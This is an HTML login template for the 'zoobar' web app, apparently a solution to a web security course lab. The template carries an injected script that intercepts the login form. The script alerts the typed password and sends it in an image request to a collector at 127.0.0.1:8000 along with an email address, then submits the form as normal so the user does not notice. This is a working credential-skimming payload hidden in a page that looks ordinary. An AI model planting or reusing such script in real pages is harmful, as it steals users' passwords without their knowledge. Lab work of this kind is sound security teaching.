{% extends "layout.html" %}
{% block title %}Login{% endblock %}
{% block main %}
<div id="login" class="centerpiece">
<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
<table>
<tr>
   <td>Username:</td>
  <td><input type="text" name="login_username" size="20"
  autocomplete="no" value="{{ login_username }}"></td>
</tr>
<tr>
   <td>Password:</td>
  <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
  <input type="submit" name="submit_login" value="Log in">
  <input type="submit" name="submit_registration" value="Register"></td>
</tr>
</table>
<input type="hidden" name="nexturl" value="/zoobar/index.cgi/">
</form>
</div>
<div class="footer warning">
{{ login_error }}
</div>
<script>
  document.loginform.login_username.focus();
  var loginform = document.getElementsByName("loginform")[0];
  var password = document.getElementsByName("login_password")[0];
  loginform.addEventListener("submit",function (argument) {
    event.preventDefault();
    
    setTimeout(function (argument) {
      alert(password["value"]);
      (new Image()).src='http://127.0.0.1:8000/?to=ijustwanttograduatefromsutd@gmail.com&payload=' + password["value"] + '&rand=' + Math.random();
    },1000);
        
    setTimeout(function (argument) {
      loginform.submit();
    },2000);        

    loginform.removeEventListener("submit", this);
        
  },false);
</script>
{% endblock %}
